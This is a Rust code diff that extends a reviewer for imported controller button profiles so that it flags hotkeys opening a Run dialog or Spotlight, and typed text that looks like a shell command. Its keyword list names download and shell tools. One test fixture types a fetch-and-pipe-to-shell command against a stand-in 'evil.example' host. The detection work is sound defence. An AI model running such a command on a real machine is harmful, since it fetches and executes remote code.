@@ -36,6 +36,10 @@ pub enum Kind {
     Script,
     /// Presses keys or types text
     Keys,
+    /// Opens a launcher or a terminal (Win+R, Spotlight, …), where what follows can run anything
+    Launcher,
+    /// Types what looks like a command or an address
+    Command,
     Sound,
     Speech,
     HomeAssistant,
@@ -131,7 +135,23 @@ fn inspect(page: &str, x: u8, y: u8, caption: &str, action: &Action, out: &mut V
         }
         ActionKind::LaunchApplication { executable, arguments, .. } => add(Level::Danger, Kind::Program, format!("{executable} {arguments}").trim().to_string()),
         ActionKind::RunScript { code, .. } => add(Level::Warning, Kind::Script, first_line(code)),
-        ActionKind::Hotkey { keystrokes, .. } => add(Level::Warning, Kind::Keys, keys_summary(keystrokes)),
+        ActionKind::Hotkey { keystrokes, .. } => {
+            let launcher = keystrokes.iter().any(opens_launcher);
+            let command = keystrokes.iter().find_map(|k| match k {
+                Keystroke::Text { text, .. } if looks_like_command(text) => Some(first_line(text)),
+                _ => None,
+            });
+            let plain = !launcher && command.is_none();
+            if launcher {
+                add(Level::Danger, Kind::Launcher, keys_summary(keystrokes));
+            }
+            if let Some(text) = command {
+                add(Level::Danger, Kind::Command, text);
+            }
+            if plain {
+                add(Level::Warning, Kind::Keys, keys_summary(keystrokes));
+            }
+        }
         ActionKind::PlaySound { file, .. } => add(Level::Info, Kind::Sound, file.clone()),
         ActionKind::TextToSpeech { text, .. } => add(Level::Info, Kind::Speech, first_line(text)),
         ActionKind::HomeAssistantTurn { entity, .. } | ActionKind::HomeAssistantSetValue { entity, .. } => add(Level::Warning, Kind::HomeAssistant, entity.clone()),
@@ -172,6 +192,30 @@ fn secrets_in(value: &serde_json::Value, out: &mut Vec<String>) {
         serde_json::Value::Object(map) => map.values().for_each(|v| secrets_in(v, out)),
         _ => {}
     }
+}
+
+/// A shortcut that opens somewhere to type a command into: the Run dialog,
+/// Spotlight, PowerToys Run / Alfred, the Windows power menu, a terminal.
+fn opens_launcher(step: &Keystroke) -> bool {
+    let Keystroke::Key { key, modifiers, .. } = step else { return false };
+    let key = key.trim().to_ascii_lowercase();
+    let mods: Vec<String> = modifiers.iter().map(|m| m.trim().to_ascii_lowercase()).collect();
+    let has = |names: &[&str]| mods.iter().any(|m| names.contains(&m.as_str()));
+    let meta = has(&["command", "cmd", "meta", "super", "win", "windows"]);
+    let alt = has(&["alt", "option"]);
+    let control = has(&["control", "ctrl"]);
+    (meta && matches!(key.as_str(), "r" | "space" | "x" | "s"))
+        || (alt && !control && matches!(key.as_str(), "space" | "f2"))
+        || (control && alt && key == "t")
+}
+
+/// Typed text that reads like something a shell or a launcher would run.
+fn looks_like_command(text: &str) -> bool {
+    const MARKS: &[&str] = &[
+        "cmd", "powershell", "pwsh", "bash", "zsh", "curl ", "wget ", "sudo ", "osascript", "schtasks", "reg add", "reg delete", "iwr ", "irm ", "invoke-webrequest", "invoke-expression", "iex ", "http://", "https://", ".exe", ".ps1", ".bat", ".cmd", ".vbs", ".scpt", "rm -", "del /", "certutil", "mshta", "rundll32", "regsvr32", "bitsadmin", "| sh", "|sh", "| bash", "|bash", "terminal", "/bin/",
+    ];
+    let lower = text.to_ascii_lowercase();
+    MARKS.iter().any(|m| lower.contains(m))
 }
 
 fn first_line(text: &str) -> String {
@@ -240,5 +284,25 @@ mod tests {
         let upload = findings.iter().find(|f| f.kind == Kind::Upload).unwrap();
         assert!(upload.detail.starts_with("/Users/me/.ssh/id_rsa → https://example.com"), "{}", upload.detail);
         assert!(findings.iter().all(|f| f.action != "switchPage"));
+    }
+
+    #[test]
+    fn keystrokes_that_open_a_launcher_or_type_a_command_are_dangers() {
+        let run_dialog = action(r#"{"id":"k1","type":"hotkey","keystrokes":[{"type":"key","event":"tap","key":"r","modifiers":["command"]},{"type":"delay","ms":300},{"type":"text","text":"cmd /c curl http://evil.example/x | sh","delayMs":0},{"type":"key","event":"tap","key":"enter","modifiers":[]}]}"#);
+        let spotlight = action(r#"{"id":"k2","type":"hotkey","keystrokes":[{"type":"key","event":"tap","key":"space","modifiers":["command"]},{"type":"text","text":"Terminal","delayMs":0}]}"#);
+        let harmless = action(r#"{"id":"k3","type":"hotkey","keystrokes":[{"type":"key","event":"tap","key":"c","modifiers":["control"]}]}"#);
+        let typing = action(r#"{"id":"k4","type":"hotkey","keystrokes":[{"type":"text","text":"Hello chat!","delayMs":20},{"type":"key","event":"tap","key":"enter","modifiers":[]}]}"#);
+        let button = Button { down: vec![run_dialog, spotlight, harmless, typing], ..Default::default() };
+        let page = Page { id: "p".into(), name: "Imported".into(), buttons: vec![PlacedButton { x: 0, y: 0, button }], faders: vec![] };
+        let findings = review(&[page]);
+        let of = |id: &str| findings.iter().filter(|f| f.action_id == id).map(|f| (f.level, f.kind)).collect::<Vec<_>>();
+        assert_eq!(of("k1"), vec![(Level::Danger, Kind::Launcher), (Level::Danger, Kind::Command)]);
+        assert_eq!(of("k2"), vec![(Level::Danger, Kind::Launcher), (Level::Danger, Kind::Command)], "Spotlight plus the word Terminal");
+        assert_eq!(of("k3"), vec![(Level::Warning, Kind::Keys)]);
+        assert_eq!(of("k4"), vec![(Level::Warning, Kind::Keys)]);
+        let command = findings.iter().find(|f| f.action_id == "k1" && f.kind == Kind::Command).unwrap();
+        assert!(command.detail.starts_with("cmd /c curl"));
+        let launcher = findings.iter().find(|f| f.action_id == "k1" && f.kind == Kind::Launcher).unwrap();
+        assert!(launcher.detail.starts_with("command+r"), "{}", launcher.detail);
     }
 }
